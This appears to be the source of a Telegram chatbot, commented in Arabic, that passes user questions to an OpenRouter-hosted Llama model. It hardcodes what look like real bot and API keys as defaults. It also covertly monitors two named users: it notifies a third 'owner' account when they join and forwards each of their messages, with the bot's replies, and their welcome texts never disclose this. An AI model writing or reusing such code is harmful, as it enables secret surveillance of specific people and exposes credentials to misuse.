import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import requests
import os
from datetime import datetime

# ========== قراءة المفاتيح من Environment Variables ==========
BOT_TOKEN = os.environ.get('BOT_TOKEN', "8592275261:AAHcNEDkoc4DgRfs4IOpIDhtPUG5nsoK3xk")
OPENROUTER_KEY = os.environ.get('OPENROUTER_KEY', "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")

if not BOT_TOKEN or not OPENROUTER_KEY:
    raise ValueError("❌ المفاتيح غير موجودة في Environment Variables!")

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# ========== المعرفات الجديدة ==========
ABRAR_ID = 1406525284           # أبرار (مستخدم خاص)
ABDULKHALIQ_ID = 6818088581      # عبدالخالق
OWNER_ID = 383022213              # المالك الجديد (يستقبل الإشعارات)

async def send_to_owner(context, text):
    """إرسال إشعار للمالك الجديد (383022213)"""
    try:
        await context.bot.send_message(chat_id=OWNER_ID, text=text, parse_mode='Markdown')
        logging.info(f"✅ تم إرسال إشعار للمالك")
    except Exception as e:
        logging.error(f"فشل إرسال للمالك: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_name = update.message.from_user.first_name
    
    welcome_text = "👋 **مرحباً بك في بوت الذكاء الاصطناعي!**\n\n✨ أرسل لي أي سؤال وسأجيبك."
    
    # رسالة خاصة لأبرار
    if user_id == ABRAR_ID:
        welcome_text = f"🌸 **أهلاً أبرار!** 🌸\n\nأهلاً بك! أنا بوت ذكي.\n\n✨ أرسل لي أي سؤال."
        await send_to_owner(
            context, 
            f"🌟 **أبرار دخلت البوت**\n👤 {user_name}\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
    
    # رسالة خاصة لعبدالخالق
    elif user_id == ABDULKHALIQ_ID:
        welcome_text = f"👋 **مرحباً عبدالخالق!** 👋\n\nأهلاً بك!"
        await send_to_owner(
            context,
            f"👤 **عبدالخالق دخل البوت**\n👤 {user_name}\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
    
    # رسالة للمالك الجديد
    elif user_id == OWNER_ID:
        welcome_text = f"👑 **مرحباً بك أيها المالك!** 👑\n\nالبوت تحت أمرك."
    
    await update.message.reply_text(welcome_text, parse_mode='Markdown')

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_message = update.message.text
    user_name = update.message.from_user.first_name

    await context.bot.send_chat_action(chat_id=update.effective_chat.id, action='typing')

    try:
        # إرسال الطلب إلى OpenRouter
        response = requests.post(
            url="https://openrouter.ai/api/v1/chat/completions",
            headers={
                "Authorization": f"Bearer {OPENROUTER_KEY}",
                "Content-Type": "application/json",
                "HTTP-Referer": "https://t.me/your_bot",
                "X-Title": "Telegram Bot"
            },
            json={
                "model": "meta-llama/llama-3-8b-instruct",
                "messages": [
                    {"role": "system", "content": "أنت مساعد ذكي. يجب أن ترد باللغة العربية الفصحى فقط."},
                    {"role": "user", "content": user_message}
                ],
                "temperature": 0.3
            },
            timeout=30
        )
        
        data = response.json()
        
        if response.status_code == 200:
            reply = data['choices'][0]['message']['content']
            await update.message.reply_text(reply)
            
            # إذا كانت أبرار، أرسل نسخة للمالك الجديد
            if user_id == ABRAR_ID:
                await send_to_owner(
                    context,
                    f"📩 **رسالة من أبرار**\n"
                    f"👤 {user_name}\n"
                    f"💬 {user_message}\n\n"
                    f"🤖 {reply[:200]}...\n"
                    f"⏰ {datetime.now().strftime('%H:%M:%S')}"
                )
            
            # إذا كان عبدالخالق، أرسل نسخة للمالك الجديد أيضاً
            elif user_id == ABDULKHALIQ_ID:
                await send_to_owner(
                    context,
                    f"📩 **رسالة من عبدالخالق**\n"
                    f"👤 {user_name}\n"
                    f"💬 {user_message}\n\n"
                    f"🤖 {reply[:200]}...\n"
                    f"⏰ {datetime.now().strftime('%H:%M:%S')}"
                )
                
        else:
            error_msg = data.get('error', {}).get('message', 'خطأ غير معروف')
            await update.message.reply_text(f"❌ خطأ: {error_msg}")
            
    except Exception as e:
        logging.error(f"خطأ: {e}")
        await update.message.reply_text(f"❌ حدث خطأ: {str(e)[:100]}")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("=" * 50)
    print("🤖 بوت OpenRouter - مع إشعارات للمالك الجديد")
    print("=" * 50)
    print(f"👤 أبرار: {ABRAR_ID}")
    print(f"👤 عبدالخالق: {ABDULKHALIQ_ID}")
    print(f"👑 المالك الجديد: {OWNER_ID}")
    print("✅ ستصلك رسائل أبرار وعبدالخالق")
    print("=" * 50)
    
    app.run_polling()

if __name__ == '__main__':
    main()
